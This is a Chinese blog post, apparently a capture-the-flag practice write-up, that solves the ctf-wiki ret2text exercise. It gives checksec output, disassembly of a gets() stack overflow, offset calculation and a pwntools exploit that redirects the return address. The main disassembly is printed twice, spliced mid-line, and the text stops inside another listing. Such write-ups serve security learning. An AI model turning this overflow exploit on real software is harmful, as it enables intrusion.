<!doctype html><html lang=zh><head><meta charset=UTF-8><meta content="IE=edge" http-equiv=X-UA-Compatible><meta content="text/html; charset=UTF-8" http-equiv=content-type><meta content="width=device-width,initial-scale=1,user-scalable=no" name=viewport><meta content="index, follow" name=robots><title>几个简单的 pwn 练习</title><meta content="几个简单的 pwn 练习" name=title><meta content=一点点从这个世界上消失。 name=description><meta content=website property=og:type><meta content=https://nnnewb.github.io/posts/2022/2022-12-31-ji-ge-jian-dan-de-pwnlian-xi/ property=og:url><meta content="weakptr's blog" property=og:site_name><meta content="几个简单的 pwn 练习" property=og:title><meta content=一点点从这个世界上消失。 property=og:description><meta content=https://nnnewb.github.io/image/favicon.ico property=og:image><meta content=summary_large_image property=twitter:card><meta content=https://nnnewb.github.io/posts/2022/2022-12-31-ji-ge-jian-dan-de-pwnlian-xi/ property=twitter:url><meta content="几个简单的 pwn 练习" property=twitter:title><meta content=一点点从这个世界上消失。 property=twitter:description><meta content=https://nnnewb.github.io/image/favicon.ico property=twitter:image><link href=https://nnnewb.github.io/posts/2022/2022-12-31-ji-ge-jian-dan-de-pwnlian-xi/ rel=canonical><link rel="shortcut icon" href=https://nnnewb.github.io/image/favicon.ico type=image/x-icon><link href=https://nnnewb.github.io/css/reset.css rel=stylesheet><link href=https://nnnewb.github.io/css/pallete.css rel=stylesheet><link href=https://nnnewb.github.io/css/suCSS.css rel=stylesheet><link href=https://nnnewb.github.io/archive.css rel=stylesheet><link href=https://nnnewb.github.io/style.css rel=stylesheet><script defer src=https://nnnewb.github.io/js/script.js></script><link crossorigin href=https://cdn.jsdelivr.net/npm/katex@0.10.0/dist/katex.min.css integrity=sha384-9eLZqc9ds8eNjO3TmqPeYcDj8n+Qfa4nuSiGYa6DjLNcv9BtN69ZIulL9+8CqC9Y rel=stylesheet><script crossorigin defer integrity=sha384-K3vbOmF2BtaVai+Qk37uypf7VrgBubhQreNQe9aGsz9lB63dIFiQVlJbr92dw2Lx src=https://cdn.jsdelivr.net/npm/katex@0.10.0/dist/katex.min.js></script><script crossorigin defer integrity=sha384-zWYbd0NBwgTsgIdFKVprSfTh1mbMPe5Hz1X3yY4Sd1h/K1cQoUe36OGwAGz/PcDy src=https://cdn.jsdelivr.net/npm/katex@0.10.0/dist/contrib/mathtex-script-type.min.js></script><script crossorigin defer integrity=sha384-kmZOZB5ObwgQnS/DuDg6TScgOiWWBiVt0plIRkZCmE6rDZGrEOQeHM5PcHi+nyqe src=https://cdn.jsdelivr.net/npm/katex@0.10.0/dist/contrib/auto-render.min.js></script><script>document.addEventListener("DOMContentLoaded", function () {
        renderMathInElement(document.body, {
            // customised options
            // • auto-render specific keys, e.g.:
            delimiters: [
                { left: '$$', right: '$$', display: true },
                { left: '$', right: '$', display: false },
                { left: '\\(', right: '\\)', display: false },
                { left: '\\[', right: '\\]', display: false }
            ],
            // • rendering keys, e.g.:
            throwOnError: true
        });
    });</script><script src=https://cdn.jsdelivr.net/npm/mermaid@11.6.0/dist/mermaid.min.js></script><script>document.addEventListener('DOMContentLoaded', function () {
        // 查找所有具有 'pre' 标签且类名为 'language-mermaid' 的元素
        const mermaidElements = document.getElementsByClassName('language-mermaid');
        for (let i = 0; i < mermaidElements.length; i++) {
            const el = mermaidElements.item(i);
            if (el.tagName === "PRE" && !el.classList.contains('mermaid')) {
                el.innerHTML = el.textContent;
                el.classList.add('mermaid');
            }
        }

        mermaid.initialize({ startOnLoad: true, theme: 'dark', });
    })</script><script>if (window.location.hostname.toLowerCase() !== 'localhost' && window.location.hostname !== '127.0.0.1') {
        var _hmt = _hmt || [];
        (function () {
            var hm = document.createElement("script");
            hm.src = "https://hm.baidu.com/hm.js?dbb9df33a2de52aede8bccd84a7493ad";
            var s = document.getElementsByTagName("script")[0];
            s.parentNode.insertBefore(hm, s);
        })();
    }</script><link href=https://chinese-fonts-cdn.deno.dev/packages/lxgwwenkaibright/dist/LXGWBright-Medium/result.css rel=stylesheet><link href=https://chinese-fonts-cdn.deno.dev/packages/maple-mono-cn/dist/MapleMono-CN-Regular/result.css rel=stylesheet><body><header><nav id=nav-bar><a href=/> 首页 </a>  /  <a href=/posts/> 文章 </a>  /  <a href=/categories/> 分类 </a>  /  <a href=/tags/> 标签 </a>  /  <a href=/search/> 搜索 </a>  /  <div><input id=theme-toggle style=display:none type=checkbox><label for=theme-toggle id=theme-toggle-label><svg class=icons id=theme-icon><use href=https://nnnewb.github.io/icons.svg#lightMode></use></svg></label><audio id=theme-sound><source src=https://nnnewb.github.io/click.ogg type=audio/ogg></audio></div></nav></header><main><h1>几个简单的 pwn 练习</h1><p class=author-line>作于：2022-12-31 14:07 ，预计阅读时间 9 分钟<article><h2 id=ret2text>ret2text</h2><blockquote><p>来源 <a href=https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/basic-rop/>ctf-wiki basic-rop</a> 。</blockquote><p><code>ret2text</code> 是最简单的一题了。gdb 确定目标地址后直接溢出即可。<h3 id=ji-ben-xin-xi>基本信息</h3><pre style=color:#fdf4c1aa;background-color:#282828><code><span># file
</span><span>bin/ret2text: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.24, BuildID[sha1]=4f13f004f23ea39d28ca91f2bb83110b4b73713f, with debug_info, not stripped
</span><span>
</span><span># checksec
</span><span>CANARY    : disabled
</span><span>FORTIFY   : disabled
</span><span>NX        : ENABLED
</span><span>PIE       : disabled
</span><span>RELRO     : Partial
</span></code></pre><h3 id=xing-wei-fen-xi>行为分析</h3><p>运行 <code>ret2text</code> 观察行为。<pre style=color:#fdf4c1aa;background-color:#282828><code><span>There is something amazing here, do you know anything?
</span><span>no
</span><span>Maybe I will tell you next time !%
</span></code></pre><h3 id=fan-bian-yi-fen-xi>反编译分析</h3><p><code>objdump -Sd ret2text</code> 然后找到 <code>main</code> 函数。<pre class=language-asm data-lang=asm style=color:#fdf4c1aa;background-color:#282828><code class=language-asm data-lang=asm><span style=color:#d3869b>08048648 </span><span style=color:#8ec07c>&lt;main>:
</span><span style=color:#8ec07c> </span><span style=color:#d3869b>8048648</span><span style=color:#8ec07c>:	</span><span style=color:#d3869b>55                   	</span><span style=color:#fa5c4b>push   </span><span style=color:#8ec07c>%</span><span style=color:#fdf4c1>ebp
</span><span style=color:#8ec07c> </span><span style=color:#d3869b>8048649</span><span style=color:#8ec07c>:	</span><span style=color:#d3869b>89 </span><span style=color:#8ec07c>e5                	</span><span style=color:#fa5c4b>mov    </span><span style=color:#8ec07c>%</span><span style=color:#fdf4c1>esp,</span><span style=color:#8ec07c>%</span><span style=color:#fdf4c1>ebp
</span><span style=color:#8ec07c> 804864b:	</span><span style=color:#d3869b>83 </span><span style=color:#8ec07c>e4 f0             	</span><span style=color:#fa5c4b>and    </span><span style=color:#fabd2f>$</span><span style=color:#d3869b>0xfffffff0</span><span style=color:#fdf4c1>,</span><span style=color:#8ec07c>%</span><span style=color:#fdf4c1>esp
</span><span style=color:#8ec07c> 804864e:	</span><span style=color:#d3869b>83 </span><span style=color:#8ec07c>c4 </span><span style=color:#d3869b>80             	</span><span style=color:#fa5c4b>add    </span><span style=color:#fabd2f>$</span><span style=color:#d3869b>0xffffff80</span><span style=color:#fdf4c1>,</span><span style=color:#8ec07c>%</span><span style=color:#fdf4c1>esp
</span><span style=color:#8ec07c> </span><span style=color:#d3869b>8048651</span><span style=color:#8ec07c>:	a1 </span><span style=color:#d3869b>60 </span><span style=color:#8ec07c>a0 </span><span style=color:#d3869b>04 08       	</span><span style=color:#fa5c4b>mov    </span><span style=color:#d3869b>0x804a060</span><span style=color:#fdf4c1>,</span><span style=color:#8ec07c>%</span><span style=color:#fdf4c1>eax
</span><span style=color:#8ec07c> </span><span style=color:#d3869b>8048656</span><span style=color:#8ec07c>:	c7 </span><span style=color:#d3869b>44 24 </span><span style=color:#8ec07c>0c </span><span style=color:#d3869b>00 00 00 	</span><span style=color:#8ec07c>movl   </span><span style=color:#fabd2f>$</span><span style=color:#d3869b>0x0</span><span style=color:#fdf4c1>,</span><span style=color:#d3869b>0xc</span><span style=color:#8ec07c>(%</span><span style=color:#fdf4c1>esp</span><span style=color:#8ec07c>)
</span><span style=color:#8ec07c> 804865d:	</span><span style=color:#d3869b>00 
</span><span style=color:#8ec07c> 804865e:	c7 </span><span style=color:#d3869b>44 24 08 02 00 00 	</span><span style=color:#8ec07c>movl   </span><span style=color:#fabd2f>$</span><span style=color:#d3869b>0x2</span><span style=color:#fdf4c1>,</span><span style=color:#d3869b>0x8</span><span style=color:#8ec07c>(%</span><span style=color:#fdf4c1>esp</span><span style=color:#8ec07c>)
</span><span style=color:#8ec07c> </span><span style=color:#d3869b>8048665</span><span style=color:#8ec07c>:	</span><span style=color:#d3869b>00 
</span><span style=color:#8ec07c> </span><span style=color:#d3869b>8048666</span><span style=color:#8ec07c>:	c7 </span><span style=color:#d3869b>44 24 04 00 00 00 	</span><span style=color:#8ec07c>movl   </span><span style=color:#fabd2f>$</span><span style=color:#d3869b>0x0</span><span style=color:#fdf4c1>,</span><span style=color:#d3869b>0x4</span><span style=color:#8ec07c>(%</span><span style=color:#fdf4c1>esp</span><span style=color:#8ec07c>)
</span><span style=color:#8ec07c> 804866d:	</span><span style=color:#d3869b>00 
</span><span style=color:#8ec07c> 804866e:	</span><span style=color:#d3869b>89 04 24             	</span><span style=color:#fa5c4b>mov    </span><span style=color:#8ec07c>%</span><span style=color:#fdf4c1>eax,</span><span style=color:#8ec07c>(%</span><span style=color:#fdf4c1>esp</span><span style=color:#8ec07c>)
</span><span style=color:#8ec07c> </span><span style=color:#d3869b>8048671</span><span style=color:#8ec07c>:	e8 5a fe ff ff       	</span><span style=color:#fa5c4b>call   </span><span style=color:#8ec07c>80484d0 &lt;setvbuf@plt>
</span><span style=color:#8ec07c> </span><span style=color:#d3869b>8048676</span><span style=color:#8ec07c>:	a1 </span><span style=color:#d3869b>40 </span><span style=color:#8ec07c>a0 </span><span style=color:#d3869b>04 08       	</span><span style=color:#fa5c4b>mov    </span><span style=color:#d3869b>0x804a040</span><span style=color:#fdf4c1>,</span><span style=color:#8ec07c>%</span><span style=color:#fdf4c1>eax
</span><span style=color:#8ec07c> 804867b:	c7 </span><span style=color:#d3869b>44 24 </span><span style=color:#8ec07c>0c </span><span style=color:#d3869b>00 00 00 	</span><span style=color:#8ec07c>movl   </span><span style=color:#fabd2f>$</span><span style=color:#d3869b>0x0</span><span style=color:#fdf4c1>,</span><span style=color:#d3869b>0xc</span><span style=color:#8ec07c>(%</span><span style=color:#fdf4c1>esp</span><span style=color:#8ec07c>)
</span><span style=color:#8ec07c> </span><span style=color:#d3869b>8048682</span><span style=color:#8ec07c>:	</span><span style=color:#d3869b>00 
</span><span style=color:#8ec07c> </span><span style=color:#d3869b>8048683</span><span style=color:#8ec07c>:	c7 </span><span style=color:#d3869b>44 24 08 01 00 00 	</span><span style=color:#8ec07c>movl   </span><span style=color:#fabd2f>$</span><span style=color:#d3869b>0x1</span><span style=color:#fdf4c1>,</span><span style=color:#d3869b>0x8</span><span style=color:#8ec07c>(%</span><span style=color:#fdf4c1>esp</span><span style=color:#8ec07c>)
</span><span style=color:#8ec07c> 804868a:	</span><span style=color:#d3869b>00 
</span><span style=color:#8ec07c> 804868b:	c7 </span><span style=color:#d3869b>44 24 04 00 00 00 	</span><span style=color:#8ec07c>movl   </span><span style=color:#fabd2f>$</span><span style=color:#d3869b>0x0</span><span style=color:#fdf4c1>,</span><span style=color:#d3869b>0x4</span><span style=color:#8ec07c>(%</span><span style=color:#fdf4c1>esp</span><span style=color:#8ec07c>)
</span><span style=color:#8ec07c> </span><span style=color:#d3869b>8048692</span><span style=color:#8ec07c>:	</span><span style=color:#d3869b>00 
</span><span style=color:#8ec07c> </span><span style=color:#d3869b>8048693</span><span style=color:#8ec07c>:	</span><span style=color:#d3869b>89 04 24             	</span><span style=color:#fa5c4b>mov    </span><span style=color:#8ec07c>%</span><span style=color:#fdf4c1>eax,</span><span style=color:#8ec07c>(%</span><span style=color:#fdf4c1>esp</span><span style=color:#8ec07c>)
</span><span style=color:#8ec07c> </span><span style=color:#d3869b>8048696</span><span style=color:#8ec07c>:	e8 </span><span style=color:#d3869b>35 </span><span style=color:#8ec07c>fe ff ff       	</span><span style=color:#fa5c4b>call   </span><span style=color:#8ec07c>80484d0 &lt;setvbuf@plt>
</span><span style=color:#8ec07c> 804869b:	c7 </span><span style=color:#d3869b>04 24 </span><span style=color:#8ec07c>6c </span><span style=color:#d3869b>87 04 08 	</span><span style=color:#8ec07c>movl   </span><span style=color:#fabd2f>$</span><span style=color:#d3869b>0x804876c</span><span style=color:#fdf4c1>,</span><span style=color:#8ec07c>(%</span><span style=color:#fdf4c1>esp</span><span style=color:#8ec07c>)
</span><span style=color:#8ec07c> 80486a2:	e8 d9 fd ff ff       	</span><span style=color:#fa5c4b>call   </span><span style=color:#d3869b>8048480 </span><span style=color:#8ec07c>&lt;puts@plt>
</span><span style=color:#8ec07c> 80486a7:	8d </span><span style=color:#d3869b>44 24 </span><span style=color:#8ec07c>1c          	</span><span style=color:#fa5c4b>lea    </span><span style=color:#d3869b>0x1c</span><span style=color:#8ec07c>(%</span><span style=color:#fdf4c1>esp</span><span style=color:#8ec07c>)</span><span style=color:#fdf4c1>,</span><span style=color:#8ec07c>%</span><span style=color:#fdf4c1>eax
</span><span style=color:#8ec07c> 80486ab:	</span><span style=color:#d3869b>89 04 24             	</span><span style=color:#fa5c4b>mov    </span><span style=color:#8ec07c>%</span><span style=color:#fdf4c1>eax,</span><span style=color:#8ec07c>(%</span><span style=color:#fdf4c1>esp</span><span style=color:#8ec07c>)
</span><span style=color:#8ec07c> 80486ae:	e8 ad fd ff ff       	</span><span style=color:#fa5c4b>call   </span><span style=color:#d3869b>8048460 </span><span style=color:#8ec07c>&lt;gets@plt>
</span><span style=color:#8ec07c> 80486b3:	c7 </span><span style=color:#d3869b>04 24 </span><span style=color:#8ec07c>a4 </span><span style=color:#d3869b>87 04 08 	</span><span style=color:#8ec07c>movl   </span><span style=color:#fabd2f>$</span><span style=color:#d3869b>0x80487a4</span><span style=color:#fdf4c1>,</span><span style=color:#8ec07c>(%</span><span style=color:#fdf4c1>esp</span><span style=color:#8ec07c>)
</span><span style=color:#8ec07c> 80486ba:	e8 </span><span style=color:#d3869b>91 </span><span style=color:#8ec07c>fd ff ff       	</span><span style=color:#fa5c4b>call   </span><span style=color:#d3869b>8048450 </span><span style=color:#8ec07c>&lt;printf@plt>
</span><span style=color:#8ec07c> 80486bf:	b8 </span><span style=color:#d3869b>00 00 00 00       	</span><span style=color:#fa5c4b>mov    </span><span style=color:#fabd2f>$</span><span style=color:#d3869b>0x0</span><span style=color:#fdf4c1>,</span><span style=color:#8ec07c>%</span><span style=color:#fdf4c1>eax
</span><span style=color:#8ec07c> 80486c4:	c9                   	</span><span style=color:#fa5c4b>leave  
</span><span style=color:#8ec07c> 80486c5:	c3                   	</span><span style=color:#fa5c4b>ret    
</span><span style=color:#8ec07c> 80486c6:	</span><span style=color:#d3869b>66 90                	</span><span style=color:#fa5c4b>xchg   </span><span style=color:#8ec07c>%</span><span style=color:#fdf4c1>ax,</span><span style=color:#8ec07c>%</span><span style=color:#fdf4c1>ax
</span><span style=color:#8ec07c> 80486c8:	</span><span style=color:#d3869b>66 90                	</span><span style=color:#fa5c4b>xchg   </span><span style=color:#8ec07c>%</span><span style=color:#fdf4c1>ax,</span><span style=color:#8ec07c>%</span><span style=color:#fdf4c1>ax
</span><span style=color:#8ec07c> 80486ca:	</span><span style=color:#d3869b>66 90                	</span><span style=color:#fa5c4b>xchg   </span><span style=color:#8ec07c>%</span><span style=color:#fdf4c1>ax,</span><span style=color:#8ec07c>%</span><span style=color:#fdf4c1>ax
</span><span style=color:#8ec07c> 80486cc:	</span><span style=color:#d3869b>66 90                	</span><span style=color:#fa5c4b>xchg   </span><span style=color:#8ec07c>%</span><span style=color:#fdf4c1>ax,</span><span style=color:#8ec07c>%</span><span style=color:#fdf4c1>ax
</span><span style=color:#8ec07c> 80486ce:	</span><span style=color:#d3869b>66 90                	</span><span style=color:#fa5c4b>xchg   </span><span style=color:#8ec07c>%</span><span style=color:#fdf4c1>ax,</span><span style=color:#8ec07c>%ax08048648 &lt;main>:
</span><span style=color:#8ec07c> </span><span style=color:#d3869b>8048648</span><span style=color:#8ec07c>:	</span><span style=color:#d3869b>55                   	</span><span style=color:#fa5c4b>push   </span><span style=color:#8ec07c>%</span><span style=color:#fdf4c1>ebp
</span><span style=color:#8ec07c> </span><span style=color:#d3869b>8048649</span><span style=color:#8ec07c>:	</span><span style=color:#d3869b>89 </span><span style=color:#8ec07c>e5                	</span><span style=color:#fa5c4b>mov    </span><span style=color:#8ec07c>%</span><span style=color:#fdf4c1>esp,</span><span style=color:#8ec07c>%</span><span style=color:#fdf4c1>ebp
</span><span style=color:#8ec07c> 804864b:	</span><span style=color:#d3869b>83 </span><span style=color:#8ec07c>e4 f0             	</span><span style=color:#fa5c4b>and    </span><span style=color:#fabd2f>$</span><span style=color:#d3869b>0xfffffff0</span><span style=color:#fdf4c1>,</span><span style=color:#8ec07c>%</span><span style=color:#fdf4c1>esp
</span><span style=color:#8ec07c> 804864e:	</span><span style=color:#d3869b>83 </span><span style=color:#8ec07c>c4 </span><span style=color:#d3869b>80             	</span><span style=color:#fa5c4b>add    </span><span style=color:#fabd2f>$</span><span style=color:#d3869b>0xffffff80</span><span style=color:#fdf4c1>,</span><span style=color:#8ec07c>%</span><span style=color:#fdf4c1>esp
</span><span style=color:#8ec07c> </span><span style=color:#d3869b>8048651</span><span style=color:#8ec07c>:	a1 </span><span style=color:#d3869b>60 </span><span style=color:#8ec07c>a0 </span><span style=color:#d3869b>04 08       	</span><span style=color:#fa5c4b>mov    </span><span style=color:#d3869b>0x804a060</span><span style=color:#fdf4c1>,</span><span style=color:#8ec07c>%</span><span style=color:#fdf4c1>eax
</span><span style=color:#8ec07c> </span><span style=color:#d3869b>8048656</span><span style=color:#8ec07c>:	c7 </span><span style=color:#d3869b>44 24 </span><span style=color:#8ec07c>0c </span><span style=color:#d3869b>00 00 00 	</span><span style=color:#8ec07c>movl   </span><span style=color:#fabd2f>$</span><span style=color:#d3869b>0x0</span><span style=color:#fdf4c1>,</span><span style=color:#d3869b>0xc</span><span style=color:#8ec07c>(%</span><span style=color:#fdf4c1>esp</span><span style=color:#8ec07c>)
</span><span style=color:#8ec07c> 804865d:	</span><span style=color:#d3869b>00 
</span><span style=color:#8ec07c> 804865e:	c7 </span><span style=color:#d3869b>44 24 08 02 00 00 	</span><span style=color:#8ec07c>movl   </span><span style=color:#fabd2f>$</span><span style=color:#d3869b>0x2</span><span style=color:#fdf4c1>,</span><span style=color:#d3869b>0x8</span><span style=color:#8ec07c>(%</span><span style=color:#fdf4c1>esp</span><span style=color:#8ec07c>)
</span><span style=color:#8ec07c> </span><span style=color:#d3869b>8048665</span><span style=color:#8ec07c>:	</span><span style=color:#d3869b>00 
</span><span style=color:#8ec07c> </span><span style=color:#d3869b>8048666</span><span style=color:#8ec07c>:	c7 </span><span style=color:#d3869b>44 24 04 00 00 00 	</span><span style=color:#8ec07c>movl   </span><span style=color:#fabd2f>$</span><span style=color:#d3869b>0x0</span><span style=color:#fdf4c1>,</span><span style=color:#d3869b>0x4</span><span style=color:#8ec07c>(%</span><span style=color:#fdf4c1>esp</span><span style=color:#8ec07c>)
</span><span style=color:#8ec07c> 804866d:	</span><span style=color:#d3869b>00 
</span><span style=color:#8ec07c> 804866e:	</span><span style=color:#d3869b>89 04 24             	</span><span style=color:#fa5c4b>mov    </span><span style=color:#8ec07c>%</span><span style=color:#fdf4c1>eax,</span><span style=color:#8ec07c>(%</span><span style=color:#fdf4c1>esp</span><span style=color:#8ec07c>)
</span><span style=color:#8ec07c> </span><span style=color:#d3869b>8048671</span><span style=color:#8ec07c>:	e8 5a fe ff ff       	</span><span style=color:#fa5c4b>call   </span><span style=color:#8ec07c>80484d0 &lt;setvbuf@plt>
</span><span style=color:#8ec07c> </span><span style=color:#d3869b>8048676</span><span style=color:#8ec07c>:	a1 </span><span style=color:#d3869b>40 </span><span style=color:#8ec07c>a0 </span><span style=color:#d3869b>04 08       	</span><span style=color:#fa5c4b>mov    </span><span style=color:#d3869b>0x804a040</span><span style=color:#fdf4c1>,</span><span style=color:#8ec07c>%</span><span style=color:#fdf4c1>eax
</span><span style=color:#8ec07c> 804867b:	c7 </span><span style=color:#d3869b>44 24 </span><span style=color:#8ec07c>0c </span><span style=color:#d3869b>00 00 00 	</span><span style=color:#8ec07c>movl   </span><span style=color:#fabd2f>$</span><span style=color:#d3869b>0x0</span><span style=color:#fdf4c1>,</span><span style=color:#d3869b>0xc</span><span style=color:#8ec07c>(%</span><span style=color:#fdf4c1>esp</span><span style=color:#8ec07c>)
</span><span style=color:#8ec07c> </span><span style=color:#d3869b>8048682</span><span style=color:#8ec07c>:	</span><span style=color:#d3869b>00 
</span><span style=color:#8ec07c> </span><span style=color:#d3869b>8048683</span><span style=color:#8ec07c>:	c7 </span><span style=color:#d3869b>44 24 08 01 00 00 	</span><span style=color:#8ec07c>movl   </span><span style=color:#fabd2f>$</span><span style=color:#d3869b>0x1</span><span style=color:#fdf4c1>,</span><span style=color:#d3869b>0x8</span><span style=color:#8ec07c>(%</span><span style=color:#fdf4c1>esp</span><span style=color:#8ec07c>)
</span><span style=color:#8ec07c> 804868a:	</span><span style=color:#d3869b>00 
</span><span style=color:#8ec07c> 804868b:	c7 </span><span style=color:#d3869b>44 24 04 00 00 00 	</span><span style=color:#8ec07c>movl   </span><span style=color:#fabd2f>$</span><span style=color:#d3869b>0x0</span><span style=color:#fdf4c1>,</span><span style=color:#d3869b>0x4</span><span style=color:#8ec07c>(%</span><span style=color:#fdf4c1>esp</span><span style=color:#8ec07c>)
</span><span style=color:#8ec07c> </span><span style=color:#d3869b>8048692</span><span style=color:#8ec07c>:	</span><span style=color:#d3869b>00 
</span><span style=color:#8ec07c> </span><span style=color:#d3869b>8048693</span><span style=color:#8ec07c>:	</span><span style=color:#d3869b>89 04 24             	</span><span style=color:#fa5c4b>mov    </span><span style=color:#8ec07c>%</span><span style=color:#fdf4c1>eax,</span><span style=color:#8ec07c>(%</span><span style=color:#fdf4c1>esp</span><span style=color:#8ec07c>)
</span><span style=color:#8ec07c> </span><span style=color:#d3869b>8048696</span><span style=color:#8ec07c>:	e8 </span><span style=color:#d3869b>35 </span><span style=color:#8ec07c>fe ff ff       	</span><span style=color:#fa5c4b>call   </span><span style=color:#8ec07c>80484d0 &lt;setvbuf@plt>
</span><span style=color:#8ec07c> 804869b:	c7 </span><span style=color:#d3869b>04 24 </span><span style=color:#8ec07c>6c </span><span style=color:#d3869b>87 04 08 	</span><span style=color:#8ec07c>movl   </span><span style=color:#fabd2f>$</span><span style=color:#d3869b>0x804876c</span><span style=color:#fdf4c1>,</span><span style=color:#8ec07c>(%</span><span style=color:#fdf4c1>esp</span><span style=color:#8ec07c>)
</span><span style=color:#8ec07c> 80486a2:	e8 d9 fd ff ff       	</span><span style=color:#fa5c4b>call   </span><span style=color:#d3869b>8048480 </span><span style=color:#8ec07c>&lt;puts@plt>
</span><span style=color:#8ec07c> 80486a7:	8d </span><span style=color:#d3869b>44 24 </span><span style=color:#8ec07c>1c          	</span><span style=color:#fa5c4b>lea    </span><span style=color:#d3869b>0x1c</span><span style=color:#8ec07c>(%</span><span style=color:#fdf4c1>esp</span><span style=color:#8ec07c>)</span><span style=color:#fdf4c1>,</span><span style=color:#8ec07c>%</span><span style=color:#fdf4c1>eax
</span><span style=color:#8ec07c> 80486ab:	</span><span style=color:#d3869b>89 04 24             	</span><span style=color:#fa5c4b>mov    </span><span style=color:#8ec07c>%</span><span style=color:#fdf4c1>eax,</span><span style=color:#8ec07c>(%</span><span style=color:#fdf4c1>esp</span><span style=color:#8ec07c>)
</span><span style=color:#8ec07c> 80486ae:	e8 ad fd ff ff       	</span><span style=color:#fa5c4b>call   </span><span style=color:#d3869b>8048460 </span><span style=color:#8ec07c>&lt;gets@plt>
</span><span style=color:#8ec07c> 80486b3:	c7 </span><span style=color:#d3869b>04 24 </span><span style=color:#8ec07c>a4 </span><span style=color:#d3869b>87 04 08 	</span><span style=color:#8ec07c>movl   </span><span style=color:#fabd2f>$</span><span style=color:#d3869b>0x80487a4</span><span style=color:#fdf4c1>,</span><span style=color:#8ec07c>(%</span><span style=color:#fdf4c1>esp</span><span style=color:#8ec07c>)
</span><span style=color:#8ec07c> 80486ba:	e8 </span><span style=color:#d3869b>91 </span><span style=color:#8ec07c>fd ff ff       	</span><span style=color:#fa5c4b>call   </span><span style=color:#d3869b>8048450 </span><span style=color:#8ec07c>&lt;printf@plt>
</span><span style=color:#8ec07c> 80486bf:	b8 </span><span style=color:#d3869b>00 00 00 00       	</span><span style=color:#fa5c4b>mov    </span><span style=color:#fabd2f>$</span><span style=color:#d3869b>0x0</span><span style=color:#fdf4c1>,</span><span style=color:#8ec07c>%</span><span style=color:#fdf4c1>eax
</span><span style=color:#8ec07c> 80486c4:	c9                   	</span><span style=color:#fa5c4b>leave
</span><span style=color:#8ec07c> 80486c5:	c3                   	</span><span style=color:#fa5c4b>ret
</span></code></pre><p>注意到不安全函数 <code>gets</code> 调用，计算 <code>lea</code> 后参数应该是 <code>0x1c(%esp)</code>，也就是栈顶往下28个字节。观察函数序言部分，<code>add    $0xffffff80,%esp</code> 分配了 128 个字节大小的栈空间，128-28=100 。初步猜测 <code>gets</code> 参数长度 100 字节。输入大于 100 即造成溢出。<p>然后我们寻找到想要返回的目标地址：<pre class=language-asm data-lang=asm style=color:#fdf4c1aa;background-color:#282828><code class=language-asm data-lang=asm><span style=color:#8ec07c>080485fd &lt;secure>:
</span><span style=color:#8ec07c>    ... 略
</span></code></pre><p>gdb 调试计算 <code>0x1c(%esp)</code> 到返回地址的距离。<p>返回地址在 <code>0xffffd24c</code>，<code>0x1c(%esp)</code> 是 <code>0xffffd1dc</code>，相减得 112 。<p>尝试写出 exploit。<pre class=language-python data-lang=python style=color:#fdf4c1aa;background-color:#282828><code class=language-python data-lang=python><span style=color:#fa5c4b>import </span><span>pwn
</span><span style=color:#fa5c4b>import </span><span>struct
</span><span>
</span><span>p </span><span style=color:#fe8019>= </span><span style=color:#fdf4c1>pwn.gdb.debug(</span><span style=color:#b8bb26>'bin/ret2text'</span><span style=color:#fdf4c1>,
</span><span style=color:#fdf4c1>                 </span><span style=color:#b8bb26>'''
</span><span style=color:#b8bb26>                 b main
</span><span style=color:#b8bb26>                 continue
</span><span style=color:#b8bb26>                 '''</span><span style=color:#fdf4c1>)
</span><span style=color:#fabd2f>print</span><span style=color:#fdf4c1>(p.recv().decode())
</span><span style=color:#fdf4c1>p.send(</span><span style=color:#fa5c4b>b</span><span style=color:#b8bb26>'A' </span><span style=color:#fe8019>* </span><span style=color:#d3869b>112 </span><span style=color:#fe8019>+ </span><span style=color:#fdf4c1>struct.pack(</span><span style=color:#b8bb26>'&lt;I'</span><span style=color:#fdf4c1>, </span><span style=color:#d3869b>0x080485fd</span><span style=color:#fdf4c1>))
</span><span style=color:#fabd2f>print</span><span style=color:#fdf4c1>(p.recv().decode())
</span><span style=color:#fdf4c1>p.interactive()
</span></code></pre><p>调试发现段错误，继续阅读 <code>secure</code> 函数的代码。<pre class=language-asm data-lang=asm style=color:#fdf4c1aa;background-color:#282828><code class=language-asm data-lang=asm><span style=color:#8ec07c>080485fd &lt;secure>:
</span><span style=color:#8ec07c> 80485fd:	</span><span style=color:#d3869b>55                   	</span><span style=color:#fa5c4b>push   </span><span style=color:#8ec07c>%</span><span style=color:#fdf4c1>ebp
</span><span style=color:#8ec07c> 80485fe:	</span><span style=color:#d3869b>89 </span><span style=color:#8ec07c>e5                	</span><span style=color:#fa5c4b>mov    </span><span style=color:#8ec07c>%</span><span style=color:#fdf4c1>esp,</span><span style=color:#8ec07c>%</span><span style=color:#fdf4c1>ebp
</span><span style=color:#8ec07c> </span><span style=color:#d3869b>8048600</span><span style=color:#8ec07c>:	</span><span style=color:#d3869b>83 </span><span style=color:#8ec07c>ec </span><span style=color:#d3869b>28             	</span><span style=color:#fa5c4b>sub    </span><span style=color:#fabd2f>$</span><span style=color:#d3869b>0x28</span><span style=color:#fdf4c1>,</span><span style=color:#8ec07c>%</span><span style=color:#fdf4c1>esp
</span><span style=color:#8ec07c> </span><span style=color:#d3869b>8048603</span><span style=color:#8ec07c>:	c7 </span><span style=color:#d3869b>04 24 00 00 00 00 	</span><span style=color:#8ec07c>movl   </span><span style=color:#fabd2f>$</span><span style=color:#d3869b>0x0</span><span style=color:#fdf4c1>,</span><span style=color:#8ec07c>(%</span><span style=color:#fdf4c1>esp</span><span style=color:#8ec07c>)
</span><span style=color:#8ec07c> 804860a:	e8 </span><span style=color:#d3869b>61 </span><span style=color:#8ec07c>fe ff ff       	</span><span style=color:#fa5c4b>call   </span><span style=color:#d3869b>8048470 </span><span style=color:#8ec07c>&lt;time@plt>
</span><span style=color:#8ec07c> 804860f:	</span><span style=color:#d3869b>89 04 24             	</span><span style=color:#fa5c4b>mov    </span><span style=color:#8ec07c>%</span><span style=color:#fdf4c1>eax,</span><span style=color:#8ec07c>(%</span><span style=color:#fdf4c1>esp</span><span style=color:#8ec07c>)
</span><span style=color:#8ec07c> </span><span style=color:#d3869b>8048612</span><span style=color:#8ec07c>:	e8 </span><span style=color:#d3869b>99 </span><span style=color:#8ec07c>fe ff ff       	</span><span style=color:#fa5c4b>call   </span><span style=color:#8ec07c>80484b0 &lt;srand@plt>
